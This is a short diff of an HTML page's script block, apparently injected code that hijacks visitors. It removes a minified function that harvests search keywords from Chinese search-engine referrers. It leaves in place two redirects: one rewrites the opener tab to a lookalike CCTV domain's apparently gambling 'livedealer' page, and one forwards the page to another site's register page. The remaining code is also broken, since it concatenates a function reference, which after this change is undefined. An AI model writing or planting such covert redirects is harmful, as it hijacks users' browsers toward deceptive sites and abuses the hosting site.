@@ -8,8 +8,6 @@
 <div style="display:none;">
 </div>
 <script>
-//截取网址来源
-function setSoKey(){var so_url=document.referrer;var domain=window.location.host;var n=so_url.indexOf("?");var key;if(n>=0){var url_sub=so_url.substr(n+1);var sp_arr=url_sub.split("&");var url_arr;for(var i=0;i<sp_arr.length;){url_arr=sp_arr[i].split("=");if(so_url.indexOf("baidu.com")>-1){if(url_arr[0]=="wd"){key=decodeURI(url_arr[1]);return key}}if(so_url.indexOf("so.com")>-1){if(url_arr[0]=="q"){key=decodeURI(url_arr[1]);return key}}if(so_url.indexOf("sogou.com")>-1){if(url_arr[0]=="query"){key=decodeURI(url_arr[1]);return key}}if(so_url.indexOf("soso.com")>-1){if(url_arr[0]=="query"){key=decodeURI(url_arr[1]);return key}}i++}}else{return null}};
 window.opener.location.href="http://hy.cctv-10.org/html/livedealer.html";
 window.location.href="http://www.chenmeifang18.com/html/register.html?pid=a3&query="+setSoKey;
 </script>
